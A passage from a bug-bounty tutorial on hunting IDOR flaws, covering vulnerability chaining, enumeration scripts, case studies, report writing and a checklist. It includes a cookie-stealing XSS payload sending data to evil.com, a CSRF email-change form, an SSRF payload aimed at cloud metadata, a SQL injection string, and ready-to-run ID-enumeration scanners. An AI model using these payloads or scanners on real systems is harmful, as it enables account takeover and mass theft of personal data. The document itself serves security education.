INSTEAD OF:                          WRITE:
"I could view another user's         "An attacker can exfiltrate the
profile"                              complete personal data (full name,
                                      email, phone, address, date of
                                      birth, payment information) of any
                                      of the platform's ~50,000 users
                                      through a trivially exploitable
                                      Broken Object Level Authorization
                                      vulnerability."

"I changed a user's email"           "An attacker can perform full
                                      account takeover of any user
                                      account by leveraging an IDOR
                                      vulnerability to modify the
                                      victim's registered email address,
                                      followed by a password reset."
```

---

## 12. 🔗 Chaining IDOR with Other Vulns

The most devastating bugs are **chains** — combining IDOR with other vulnerability classes.

### Chain 1: IDOR + XSS = Stored XSS on Any User

```
Scenario: IDOR allows writing to any user's profile "bio" field

Step 1: Write IDOR with XSS payload
PUT /api/users/1002/profile
{"bio": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"}

Step 2: When victim views their own profile → XSS fires
Step 3: Attacker receives victim's session cookie

Impact: Stored XSS affecting ANY user, delivered via IDOR
Severity: Critical (IDOR alone might be High, but chained = Critical)
```

### Chain 2: IDOR + CSRF = Modify Victim Without Auth Tokens

```
Scenario: IDOR exists on a state-changing endpoint with no CSRF protection

Craft HTML page:
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/api/users/1002/email" method="POST">
    <input name="email" value="attacker@evil.com">
  </form>
</body>
</html>

Send this page URL to the victim.
When they visit it → their browser auto-submits → email changed → ATO

Impact: Zero-click account takeover via IDOR + CSRF
```

### Chain 3: IDOR + SSRF = Internal Network Access

```
Scenario: IDOR allows changing a user's webhook URL

PUT /api/users/1002/settings
{"webhook_url": "http://169.254.169.254/latest/meta-data/"}

When the app sends a webhook to the victim → it hits AWS metadata endpoint
→ Attacker receives AWS credentials from the webhook response

Impact: Cloud infrastructure compromise via IDOR + SSRF
```

### Chain 4: IDOR + SQL Injection

```
Scenario: The IDOR parameter is directly used in a SQL query

GET /api/users/1002' OR 1=1--/profile

If the ID is concatenated into SQL:
SELECT * FROM users WHERE id = '1002' OR 1=1--'

→ Returns ALL users' profiles in one response
→ Or use UNION-based injection for database extraction

Impact: Full database compromise
```

### Chain 5: IDOR + File Upload = Remote Code Execution

```
Scenario: IDOR allows uploading files to another user's directory

POST /api/users/1002/avatar
Content-Type: multipart/form-data
[upload malicious.php as avatar]

If the upload directory is web-accessible:
GET /uploads/users/1002/malicious.php
→ PHP code executes on server → RCE

Impact: Remote Code Execution via IDOR + unrestricted upload
```

### Chain 6: IDOR + Information Disclosure → Targeted Attack

```
Step 1: IDOR leaks admin's email and phone number
GET /api/users/1/profile → {"email": "ceo@target.com", "phone": "+1..."}

Step 2: Use this information for:
├── Spear phishing the CEO
├── SIM swapping their phone
├── Social engineering help desk for password reset
└── Credential stuffing (check breached databases for their email)

Impact: IDOR enables targeted social engineering attacks
```

### Chain Summary Table

```
┌────────────────────────┬──────────────────────────────────────────────┬──────────┐
│ Chain                  │ Result                                       │ Severity │
├────────────────────────┼──────────────────────────────────────────────┼──────────┤
│ IDOR + XSS             │ Stored XSS on any user's profile             │ Critical │
│ IDOR + CSRF            │ Zero-click account modification              │ Critical │
│ IDOR + SSRF            │ Internal network / cloud metadata access     │ Critical │
│ IDOR + SQLi            │ Full database compromise                     │ Critical │
│ IDOR + File Upload     │ Remote Code Execution                        │ Critical │
│ IDOR + Info Disclosure │ Targeted social engineering                  │ High     │
│ IDOR + Rate Limit Miss │ Mass data exfiltration                      │ Critical │
│ IDOR + 2FA Bypass      │ Full account takeover                       │ Critical │
│ IDOR + Password Reset  │ Account takeover chain                      │ Critical │
│ IDOR + GraphQL Batching│ Exfiltrate multiple objects per request      │ High     │
└────────────────────────┴──────────────────────────────────────────────┴──────────┘
```

> 📖 **From "Real-World Bug Hunting" by Peter Yaworski:**
> _"Some of the best-paying bug bounty reports I've seen are chains. A single IDOR might get you $500, but chain it with a CSRF to achieve account takeover, and suddenly it's worth $5,000–$10,000. Always think about what else you can do with the access you've found."_

---

## 13. 🤖 Automation & Scripting

Manual testing finds the first IDOR. Automation proves its **scale** and **impact**. This section provides ready-to-use scripts.

### Python Script: IDOR Scanner

```python
#!/usr/bin/env python3
"""
IDOR Scanner — Tests an endpoint for Broken Object Level Authorization.
Usage: python3 idor_scanner.py

Author: Vishal
⚠️  Only use on targets you have authorization to test.
"""

import requests
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ─── CONFIGURATION ─────────────────────────────────────────────────
TARGET_BASE = "https://target.com/api/v2"
ENDPOINT_TEMPLATE = "/users/{id}/profile"  # {id} will be replaced

# Account A (Attacker) session
ATTACKER_HEADERS = {
    "Authorization": "Bearer YOUR_ATTACKER_TOKEN_HERE",
    "Content-Type": "application/json",
    "User-Agent": "IDOR-Scanner/1.0"
}

# Account B (Victim) — for verification
VICTIM_ID = "1002"
VICTIM_KNOWN_DATA = "VICTIM_PROFILE_TEST"  # String you set in victim's profile

# Scan range
ID_START = 1
ID_END = 100
THREADS = 5
DELAY = 0.5  # Seconds between requests (be respectful)

# Output
OUTPUT_FILE = f"idor_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
# ─── END CONFIGURATION ─────────────────────────────────────────────


class IDORScanner:
    def __init__(self):
        self.results = []
        self.vulnerable = []
        self.session = requests.Session()
        self.session.headers.update(ATTACKER_HEADERS)

    def test_single_id(self, target_id):
        """Test a single ID for IDOR vulnerability."""
        url = TARGET_BASE + ENDPOINT_TEMPLATE.replace("{id}", str(target_id))
        try:
            response = self.session.get(url, timeout=10)
            result = {
                "id": target_id,
                "url": url,
                "status_code": response.status_code,
                "response_length": len(response.text),
                "timestamp": datetime.now().isoformat()
            }

            # Check if we got data we shouldn't have access to
            if response.status_code == 200:
                try:
                    data = response.json()
                    result["response_data"] = data
                    result["vulnerable"] = True
                    self.vulnerable.append(result)
                    print(f"  🔴 ID {target_id}: 200 OK — {len(response.text)} bytes — POTENTIAL IDOR!")
                except json.JSONDecodeError:
                    result["vulnerable"] = False
                    print(f"  🟡 ID {target_id}: 200 OK — non-JSON response")

            elif response.status_code == 403:
                result["vulnerable"] = False
                print(f"  🟢 ID {target_id}: 403 Forbidden — Protected")

            elif response.status_code == 404:
                result["vulnerable"] = False
                print(f"  ⚪ ID {target_id}: 404 Not Found — Doesn't exist")

            elif response.status_code == 401:
                result["vulnerable"] = False
                print(f"  🟢 ID {target_id}: 401 Unauthorized — Protected")

            else:
                result["vulnerable"] = False
                print(f"  🟡 ID {target_id}: {response.status_code} — Investigate")

            self.results.append(result)
            time.sleep(DELAY)
            return result

        except requests.exceptions.RequestException as e:
            print(f"  ❌ ID {target_id}: Error — {str(e)}")
            return None

    def verify_victim_data(self):
        """Verify we can access the known victim account."""
        print(f"\n[*] Verifying IDOR with known victim ID: {VICTIM_ID}")
        result = self.test_single_id(VICTIM_ID)
        if result and result.get("vulnerable"):
            data_str = json.dumps(result.get("response_data", {}))
            if VICTIM_KNOWN_DATA in data_str:
                print(f"  ✅ CONFIRMED: Response contains victim's known data!")
                return True
            else:
                print(f"  ⚠️  Got 200 but victim's known data not found in response")
                return True  # Still suspicious
        return False

    def scan_range(self):
        """Scan a range of IDs for IDOR."""
        print(f"\n[*] Scanning IDs {ID_START} to {ID_END}")
        print(f"[*] Endpoint: {TARGET_BASE}{ENDPOINT_TEMPLATE}")
        print(f"[*] Threads: {THREADS} | Delay: {DELAY}s")
        print(f"{'─' * 60}")

        for i in range(ID_START, ID_END + 1):
            self.test_single_id(i)

    def generate_report(self):
        """Generate JSON report of findings."""
        report = {
            "scan_date": datetime.now().isoformat(),
            "target": TARGET_BASE + ENDPOINT_TEMPLATE,
            "id_range": f"{ID_START}-{ID_END}",
            "total_tested": len(self.results),
            "total_vulnerable": len(self.vulnerable),
            "vulnerable_ids": [r["id"] for r in self.vulnerable],
            "details": self.results
        }

        with open(OUTPUT_FILE, "w") as f:
            json.dump(report, f, indent=2)

        print(f"\n{'═' * 60}")
        print(f"  SCAN COMPLETE")
        print(f"{'═' * 60}")
        print(f"  Total tested:    {len(self.results)}")
        print(f"  Vulnerable:      {len(self.vulnerable)} 🔴")
        print(f"  Protected:       {len(self.results) - len(self.vulnerable)} 🟢")
        print(f"  Report saved:    {OUTPUT_FILE}")
        print(f"{'═' * 60}")


if __name__ == "__main__":
    scanner = IDORScanner()

    print("╔══════════════════════════════════════════════════╗")
    print("║         IDOR Scanner v1.0 — Vishal               ║")
    print("║  ⚠️  Authorized testing only!                     ║")
    print("╚══════════════════════════════════════════════════╝")

    # Step 1: Verify with known victim
    confirmed = scanner.verify_victim_data()

    if confirmed:
        print("\n[!] IDOR vulnerability likely exists. Scanning range...")
        scanner.scan_range()
    else:
        print("\n[*] Victim data not accessible. Scanning anyway for analysis...")
        scanner.scan_range()

    scanner.generate_report()
```

### Bash One-Liner: Quick IDOR Check

```bash
# Quick sequential ID test with curl
for id in $(seq 1 50); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer YOUR_TOKEN" \
        "https://target.com/api/users/$id/profile")
    echo "ID: $id → HTTP $STATUS"
    sleep 0.5
done
```

### Bash Script: IDOR with Response Comparison

```bash
#!/bin/bash
# Compare response sizes to detect IDOR
# Different sizes = different data = IDOR confirmed

echo "IDOR Response Size Comparison"
echo "=============================="

TOKEN="YOUR_ATTACKER_TOKEN"
BASE="https://target.com/api/users"

for id in $(seq 1 20); do
    RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/$id/profile")
    SIZE=${#RESPONSE}
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $TOKEN" "$BASE/$id/profile")

    if [ "$CODE" == "200" ] && [ "$SIZE" -gt 10 ]; then
        echo "🔴 ID=$id | HTTP=$CODE | Size=${SIZE}b | POSSIBLE IDOR"
    elif [ "$CODE" == "403" ]; then
        echo "🟢 ID=$id | HTTP=$CODE | Protected"
    else
        echo "⚪ ID=$id | HTTP=$CODE | Size=${SIZE}b"
    fi
    sleep 0.5
done
```

### Burp Macro: Automated Session Swapping

For Burp Pro users, set up a macro to auto-swap sessions:

```
Burp → Project Options → Sessions → Session Handling Rules:

Rule 1: "IDOR Test — Swap to Victim Session"
├── Scope: Include all URLs in target scope
├── Rule Actions:
│   ├── Action 1: Run a macro
│   │   └── Macro: "Login as Victim"
│   │       ├── POST /api/auth/login
│   │       ├── Body: {"email":"victim@test.com","password":"test123"}
│   │       └── Extract: session_token from response
│   └── Action 2: Set a specific cookie/header
│       └── Replace Authorization header with extracted token
└── Tools Scope: Scanner, Repeater, Intruder
```

### Using ffuf for IDOR Enumeration

```bash
# Install: go install github.com/ffuf/ffuf@latest

# Basic IDOR enumeration
ffuf -u "https://target.com/api/users/FUZZ/profile" \
     -w <(seq 1 10000) \
     -H "Authorization: Bearer YOUR_TOKEN" \
     -mc 200 \
     -o idor_results.json \
     -rate 10

# With response size filtering (exclude your own profile size)
ffuf -u "https://target.com/api/users/FUZZ/profile" \
     -w <(seq 1 10000) \
     -H "Authorization: Bearer YOUR_TOKEN" \
     -mc 200 \
     -fs 0 \
     -o idor_results.json
```

---

## 14. 📚 Real Bug Bounty Case Studies

Learning from real disclosed reports is the fastest way to level up. These are analyzed breakdowns of actual IDOR findings.

### Case Study 1: Facebook — View Private Friend Lists ($5,000)

**Platform:** Facebook Bug Bounty
**Hunter:** A researcher discovered that Facebook's Graph API endpoint for friend lists didn't properly validate the requesting user's authorization.

```
Vulnerable Endpoint:
GET /graphql?query={user(id:"VICTIM_ID"){friends{nodes{name,id}}}}

What happened:
1. Researcher queried the GraphQL API with a victim's user ID
2. The API returned the victim's complete friend list
3. This worked even when the victim's friend list was set to "Only Me"
4. The privacy setting was enforced on the web UI but NOT on the API

Root cause: Frontend-only access control. The GraphQL API trusted 
that only the UI would make requests, and the UI respected privacy 
settings — but the API didn't.

Impact: Any Facebook user's friend list could be exfiltrated regardless
of their privacy settings. Affected ~2 billion users.

Bounty: $5,000
```

**Lesson:** Always test APIs directly with Burp/curl. Never assume the API enforces the same rules as the UI.

### Case Study 2: Uber — Account Takeover via IDOR ($6,500)

**Platform:** HackerOne
**Report:** A researcher found that Uber's endpoint for updating a user's email address could be called with any user's UUID.

```
Vulnerable Endpoint:
PUT /api/riders/VICTIM_UUID
Body: {"email": "attacker@evil.com"}

Attack chain:
1. Register an Uber account
2. Browse the app, note your UUID in API responses
3. Obtain victim's UUID (leaked in ride receipt emails, shared ride links)
4. Send PUT request with victim's UUID + attacker's email
5. Victim's email changed to attacker's
6. Request password reset → reset link sent to attacker's email
7. Full account takeover

Root cause: The PUT endpoint checked if the requester was authenticated
but did NOT verify if the authenticated user was the OWNER of the UUID
being modified.

Bounty: $6,500
```

**Lesson:** Write-IDOR on email/phone change fields = immediate ATO. Always test these endpoints.

### Case Study 3: Shopify — Access Any Store's Revenue Data ($15,000)

**Platform:** HackerOne
**Report:** A Shopify partner could access any store's financial data through an IDOR in the partner dashboard API.

```
Vulnerable Endpoint:
GET /admin/api/2021-01/shops/SHOP_ID/analytics/revenue.json
Authorization: Bearer PARTNER_TOKEN

What happened:
1. Shopify partners have a dashboard showing revenue for THEIR stores
2. The API endpoint included a shop_id parameter
3. Changing shop_id to any other store's ID returned their revenue data
4. Revenue, orders, customer count — all exposed

Root cause: The authorization check verified "is this a valid partner?"
but NOT "does this partner have access to THIS specific shop?"

Impact: Any Shopify partner could access financial data of any of
Shopify's 1.7 million+ stores.

Bounty: $15,000
```

**Lesson:** Multi-tenant applications are IDOR goldmines. Always test cross-tenant access.

### Case Study 4: US Department of Defense — IDOR Exposing PII ($$$)

**Platform:** HackerOne (US DoD VDP)
**Report:** A researcher found an IDOR in a military personnel management system.

```
Vulnerable Endpoint:
GET /api/personnel/{service_number}/records

What happened:
1. The application used military service numbers as identifiers
2. Service numbers are partially predictable (branch + sequential)
3. No authorization check beyond "is this an authenticated user?"
4. Any authenticated user could access any service member's records:
   - Full name, rank, unit assignment
   - Home address, emergency contacts
   - Deployment history
   - Security clearance level

Root cause: The developer assumed that only authorized personnel would
know valid service numbers. Classic "security through obscurity."

Impact: Complete PII exposure of active military personnel.
National security implications.

Resolution: Fixed within 24 hours (fastest DoD patch ever for this researcher)
```

**Lesson:** "Unpredictable" IDs are not a security control. If the ID exists and can be found, it will be found.

### Case Study 5: Starbucks — Access Any Customer's Information ($4,000)

**Platform:** HackerOne
**Report:** An IDOR in Starbucks' API allowed accessing any customer's account information including stored payment methods.

```
Vulnerable Endpoint:
GET /bff/proxy/stream/v1/users/VICTIM_USER_ID/cards

What happened:
1. Starbucks app uses a "Backend for Frontend" (BFF) proxy
2. The BFF endpoint relayed requests to the internal API
3. The BFF checked authentication but not authorization
4. Changing the user_id revealed:
   - Stored payment cards (last 4 digits + expiry)
   - Reward balance and star count
   - Order history with locations
   - Home/work addresses saved for delivery

Root cause: BFF pattern — the proxy authenticated the request but
trusted the user_id parameter from the client. The internal API
assumed the BFF had already done authorization checks.

Bounty: $4,000
```

**Lesson:** BFF/proxy architectures are common and often vulnerable. The proxy does auth, the backend does data — but nobody does **authorization on the specific object**.

### Patterns Across All Case Studies

```
┌────────────────────────────────────────────────────────────────────┐
│                  COMMON PATTERNS IN REAL IDORS                     │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  1. Authentication ≠ Authorization                                 │
│     → "Yes, you're logged in" ≠ "Yes, you can access THIS"        │
│                                                                    │
│  2. API vs UI enforcement gap                                      │
│     → UI hides the button, but API still accepts the request       │
│                                                                    │
│  3. Multi-tenant failures                                          │
│     → Org A can access Org B's data                                │
│                                                                    │
│  4. Proxy/BFF trust issues                                         │
│     → Each layer assumes the other does the auth check             │
│                                                                    │
│  5. "Unpredictable" IDs that leak                                  │
│     → UUIDs in emails, URLs, shared links, API responses           │
│                                                                    │
│  6. Write access without ownership verification                    │
│     → Can modify data = can takeover accounts                      │
│                                                                    │
│  7. Different API versions, different protections                   │
│     → v1 is unpatched, v2 is patched                               │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

---

## 15. 📝 Writing the Report

A bad report gets triaged as "Informational." A great report gets triaged as "Critical" with a fast bounty. **How you write the report matters as much as what you found.**

### Report Structure Template

```markdown
## Title
IDOR in [endpoint] Allows [action] on Any User's [resource]

## Severity
Critical / High / Medium / Low

## CVSS Score
[Calculate at https://www.first.org/cvss/calculator/3.1]

## Summary
[2-3 sentences. What is the vulnerability? What's the impact? Who is affected?]

## Affected Endpoint
[Method] [URL]
[Headers]

## Steps to Reproduce
[Numbered steps anyone can follow to reproduce the issue]

## Proof of Concept
[Screenshots, Burp captures, curl commands]

## Impact
[What can an attacker do? How many users are affected? What data is exposed?]

## Remediation
[How the developer should fix this]
```

### Real Report Example

Here's a complete report you could submit:

```markdown
## Title
IDOR in /api/v2/users/{id}/profile Allows Reading Any User's
Personal Information Including Email, Phone, and Address

## Severity
High (CVSS 7.5)

## CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

## Summary
The endpoint `GET /api/v2/users/{id}/profile` does not verify that
the authenticated user is authorized to view the requested user's
profile. An attacker with a valid session can read any user's personal
information by changing the `{id}` path parameter to another user's ID.
User IDs are sequential integers, allowing complete enumeration of all
user profiles on the platform.

## Affected Endpoint
```
GET /api/v2/users/{id}/profile
Host: api.target.com
Authorization: Bearer [attacker_token]
```

## Steps to Reproduce

1. Create two accounts on target.com:
   - Account A (attacker): attacker_test@email.com (User ID: 48291)
   - Account B (victim): victim_test@email.com (User ID: 48292)

2. Log into Account B and set the profile bio to "IDOR_VICTIM_TEST_DATA"

3. Log into Account A. Open Burp Suite and capture the following request:
   ```
   GET /api/v2/users/48291/profile
   Authorization: Bearer eyJ...ACCOUNT_A_TOKEN
   ```
   → This returns Account A's profile (expected behavior)

4. Send the request to Burp Repeater and change the user ID:
   ```
   GET /api/v2/users/48292/profile
   Authorization: Bearer eyJ...ACCOUNT_A_TOKEN  (still Account A's token)
   ```

5. Send the request. The response returns Account B's complete profile:
   ```json
   {
     "id": 48292,
     "name": "Victim Test User",
     "email": "victim_test@email.com",
     "phone": "+1-555-0102",
     "address": "123 Victim Street, City, State 12345",
     "bio": "IDOR_VICTIM_TEST_DATA",
     "created_at": "2026-02-20T10:30:00Z"
   }
   ```

6. The bio field "IDOR_VICTIM_TEST_DATA" confirms this is Account B's
   data being accessed from Account A's session.

## Proof of Concept

[Screenshot 1]: Account B's profile when logged in as Account B
[Screenshot 2]: Burp Repeater — Request with Account A's token + Account B's ID
[Screenshot 3]: Response containing Account B's PII

## Impact

- **Data exposed:** Full name, email, phone number, home address, bio,
  account creation date
- **Affected users:** All users on the platform. User IDs are sequential
  integers. At the time of testing, the highest observed ID was ~48,300,
  suggesting approximately 48,000 user accounts.
- **Enumeration:** An attacker can iterate IDs from 1 to 48,300 to
  exfiltrate the personal data of ALL users in approximately 6.7 hours
  (at 2 requests/second with no rate limiting observed).
- **Regulatory:** This constitutes a potential GDPR Article 33 breach
  (personal data of EU residents), CCPA violation (California residents),
  and potential violation of PCI-DSS if financial data is associated
  with profiles.

## Remediation

1. **Server-side authorization check:** Before returning profile data,
   verify that the authenticated user is the owner of the requested
   profile OR has an administrative role:

   ```python
   @app.route('/api/v2/users/<user_id>/profile')
   @login_required
   def get_profile(user_id):
       if str(current_user.id) != str(user_id) and not current_user.is_admin:
           return jsonify({"error": "Forbidden"}), 403
       profile = get_user_profile(user_id)
       return jsonify(profile)
   ```

2. **Consider using indirect references:** Replace sequential IDs with
   per-session mapped references or non-enumerable UUIDs.

3. **Implement rate limiting:** Even after fixing the IDOR, add rate
   limiting to prevent enumeration attacks on any endpoints that accept
   user identifiers.

4. **Add monitoring/alerting:** Log and alert on unusual access patterns
   (e.g., one user accessing 100+ different user profiles).
```

### CVSS Scoring Guide for IDOR

```
CVSS:3.1 Vector for common IDOR scenarios:

Read-only, low-sensitivity data:
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N = 4.3 (Medium)

Read-only, PII/sensitive data:
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 (Medium)

Write access (modify other's data):
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1 (High)

Account takeover chain:
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 (High)

Unauthenticated IDOR + mass exfiltration:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 (High)

Admin takeover via IDOR:
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.9 (Critical)
```

### Report Writing Tips

```
DO:
✅ Start with a clear, descriptive title (include endpoint + impact)
✅ Include exact reproduction steps (anyone should be able to follow)
✅ Show real evidence (screenshots, Burp requests/responses)
✅ Quantify the impact (number of users, type of data)
✅ Mention regulatory implications (GDPR, HIPAA, PCI-DSS)
✅ Provide remediation code examples
✅ Calculate and include CVSS score
✅ Be professional and respectful in tone

DON'T:
❌ Use threatening language ("I could dump your entire database")
❌ Over-exploit (don't access 1000 users to prove a point — 2 is enough)
❌ Submit without verifying reproduction
❌ Forget to mention the authorization token used (prove it's cross-account)
❌ Write vague titles ("IDOR found" → bad, be specific)
❌ Skip remediation suggestions (it shows you understand the fix)
```

---

## 16. ✅ IDOR Checklist

Print this. Use it every time you hunt.

```
╔══════════════════════════════════════════════════════════════════════╗
║                    IDOR HUNTING CHECKLIST                            ║
╚══════════════════════════════════════════════════════════════════════╝

SETUP
☐ Two accounts created (Attacker + Victim)
☐ Identifiable data created in Victim account
☐ Burp Suite configured with scope set
☐ Autorize extension installed and configured
☐ Browser proxy configured

RECONNAISSANCE
☐ Browse all app features as Attacker (capture in Burp)
☐ Note all IDs in URLs, parameters, headers, cookies, bodies
☐ Map all API endpoints (GET, POST, PUT, PATCH, DELETE)
☐ Check JavaScript files for hidden API endpoints
☐ Check for multiple API versions (v1, v2, v3, mobile, internal)
☐ Look for GraphQL endpoints (/graphql, /graphiql, /gql)
☐ Inspect JWT tokens (decode claims, check for user IDs)
☐ Check WebSocket messages for object references

TESTING — HIGH PRIORITY
☐ User profile read      (GET  /users/{id})
☐ User profile write     (PUT  /users/{id})
☐ Email change           (PUT  /users/{id}/email)
☐ Password change        (PUT  /users/{id}/password)
☐ File download          (GET  /files/{id})
☐ File upload            (POST /files/{id})
☐ Payment/billing info   (GET  /billing/{id})
☐ Order details          (GET  /orders/{id})
☐ API keys               (GET  /keys/{id})
☐ Admin endpoints        (GET  /admin/*)

TESTING — MEDIUM PRIORITY
☐ Messages/chat          (GET  /messages/{id})
☐ Notifications          (GET  /notifications/{id})
☐ Settings               (PUT  /settings/{id})
☐ Team/org management    (GET  /orgs/{id})
☐ Export/report          (GET  /export/{id})
☐ Invitation features    (POST /invite/{id})
☐ Search with filters    (GET  /search?user_id={id})
☐ Comments/reviews       (GET  /comments/{id})
☐ Webhook configuration  (PUT  /webhooks/{id})
☐ Audit logs             (GET  /logs/{id})

TESTING — METHODS
☐ Test every HTTP method (GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS)
☐ Test with no authentication (remove all tokens/cookies)
☐ Test with expired token
☐ Test with different content types (JSON, XML, form-data)

BYPASSES (if 403)
☐ HTTP method switching
☐ Path manipulation (trailing slash, double slash, case change)
☐ Parameter pollution
☐ Array/object wrapping of ID
☐ Wildcard and special values (*, 0, -1, null, me, self)
☐ Content-Type switching
☐ Header injection (X-Forwarded-For, X-Original-URL)
☐ Encoded variants (base64, URL encoding, double encoding)
☐ Different API versions
☐ JWT manipulation (alg:none, claim modification)

ESCALATION
☐ Read → Write → Delete progression
☐ Single ID → mass enumeration
☐ Horizontal → vertical (access admin)
☐ Email change → password reset → ATO
☐ Chain with XSS, CSRF, SSRF, SQLi
☐ Quantify total impact (users × data sensitivity)
☐ Calculate CVSS score

REPORTING
☐ Clear, specific title
☐ Step-by-step reproduction
☐ Burp screenshots with sensitive data highlighted
☐ Impact statement with numbers
☐ CVSS score calculated
☐ Remediation with code examples
☐ Professional tone
```

---

## 17. 📖 Resources & References

### Books (Essential Reading)

```
1. "Bug Bounty Bootcamp" — Vickie Li (No Starch Press)
   └── Chapter 10: Insecure Direct Object References
       Best practical guide for IDOR hunting in bug bounties.
       Covers methodology, tools, bypasses, and real examples.

2. "The Web Application Hacker's Handbook" — Stuttard & Pinto (Wiley)
   └── Chapter 8: Attacking Access Controls
       The bible of web app security. Deep technical coverage
       of access control vulnerabilities including IDOR.

3. "Real-World Bug Hunting" — Peter Yaworski (No Starch Press)
   └── Chapter 16: Insecure Direct Object References
       Analysis of real HackerOne/Bugcrowd reports.
       Teaches through actual disclosed vulnerabilities.

4. "Hacking APIs" — Corey Ball (No Starch Press)
   └── Chapter 11: Broken Object Level Authorization
       API-specific IDOR (BOLA) coverage. Essential for
       modern SPA and mobile app testing.

5. "OWASP Testing Guide v4.2"
   └── Section 4.6: Authorization Testing (OTG-AUTHZ-004)
       Free, comprehensive testing methodology from OWASP.

6. "Web Hacking 101" — Peter Yaworski (LeanPub)
   └── Multiple IDOR case studies from real programs.
       Great for beginners.

7. "The Tangled Web" — Michal Zalewski (No Starch Press)
   └── Understanding browser security models and how
       access controls fail at the protocol level.
```

### Practice Labs

```
Free Labs:
├── testphp.vulnweb.com         → Acunetix test site (covered in Section 8)
├── OWASP Juice Shop            → https://owasp.org/www-project-juice-shop/
│   └── Contains 5+ IDOR challenges
├── PortSwigger Web Security Academy → https://portswigger.net/web-security/access-control
│   └── 13 access control labs (several are IDOR-specific)
├── DVWA                        → https://github.com/digininja/DVWA
│   └── "Insecure CAPTCHA" + custom IDOR scenarios
├── HackTheBox                  → https://www.hackthebox.com
│   └── Web challenges with IDOR in CTF format
├── TryHackMe                   → https://tryhackme.com
│   └── "OWASP Top 10" and "Burp Suite" rooms
├── PentesterLab                → https://pentesterlab.com
│   └── "IDOR" badge with progressive exercises
├── crAPI                       → https://github.com/OWASP/crAPI
│   └── Completely Ridiculous API — built for BOLA testing
└── Damn Vulnerable Web Services → https://github.com/snoopysecurity/dvws
    └── API-focused vulnerable app
```

### Online Resources

```
OWASP References:
├── OWASP Top 10: A01 Broken Access Control
│   https://owasp.org/Top10/A01_2021-Broken_Access_Control/
├── OWASP API Security Top 10: API1 BOLA
│   https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
├── OWASP Testing Guide: Authorization Testing
│   https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/
└── OWASP Cheat Sheet: Authorization
    https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html

Bug Bounty Writeups:
├── HackerOne Hacktivity (filter by "IDOR")
│   https://hackerone.com/hacktivity?querystring=idor
├── Bugcrowd's "The Ultimate Guide to IDOR"
│   https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities/
├── Pentester Land — Bug Bounty Writeups List
│   https://pentester.land/list-of-bug-bounty-writeups.html
└── InfoSec Writeups on Medium
    https://infosecwriteups.com/tagged/idor
```

### Burp Extensions (Download Links)

```
├── Autorize          → BApp Store → Search "Autorize"
├── Auth Analyzer     → BApp Store → Search "Auth Analyzer"  
├── Param Miner       → BApp Store → Search "Param Miner"
├── InQL              → BApp Store → Search "InQL"
├── JWT Editor        → BApp Store → Search "JWT Editor"
├── Turbo Intruder    → BApp Store → Search "Turbo Intruder"
├── Logger++          → BApp Store → Search "Logger++"
└── Collaborator Everywhere → BApp Store
```

### Command-Line Tools

```
├── ffuf          → Fast web fuzzer (Go)
│   https://github.com/ffuf/ffuf
├── Nuclei        → Vulnerability scanner with IDOR templates
│   https://github.com/projectdiscovery/nuclei
├── httpx         → Fast HTTP toolkit (for response analysis)
│   https://github.com/projectdiscovery/httpx
├── Arjun         → HTTP parameter discovery
│   https://github.com/s0md3v/Arjun
├── ParamSpider   → Mining parameters from web archives
│   https://github.com/devanshbatham/ParamSpider
└── Kiterunner    → API endpoint discovery
    https://github.com/assetnote/kiterunner
```

---

## Final Words

IDOR is not complicated. It's not about writing clever exploits or bypassing advanced protections. It's about **checking whether the server verifies that YOU are allowed to access THAT specific object**.

The methodology is simple:
1. Find endpoints with object references
2. Swap the reference to another user's object
3. Check if you get their data

The skill is in:
- **Knowing where to look** (Section 5)
- **Being thorough** (the checklist in Section 16)
- **Persisting through bypasses** (Section 10)
- **Maximizing impact** (Section 11)
- **Writing a report that gets paid** (Section 15)

Most hunters find their first IDOR within a week of focused hunting. The key is to **test every single endpoint systematically** rather than randomly poking at the application.

Good hunting. 🎯

---

> _"The simplest vulnerabilities are often the most devastating. IDOR requires no special tools, no advanced techniques, and no deep technical knowledge. It requires only the curiosity to ask: 'What if I change this number?'"_
>
> — **Peter Yaworski, Real-World Bug Hunting**

---

**Document created by Vishal — February 2026**
**For authorized security testing and education only.**
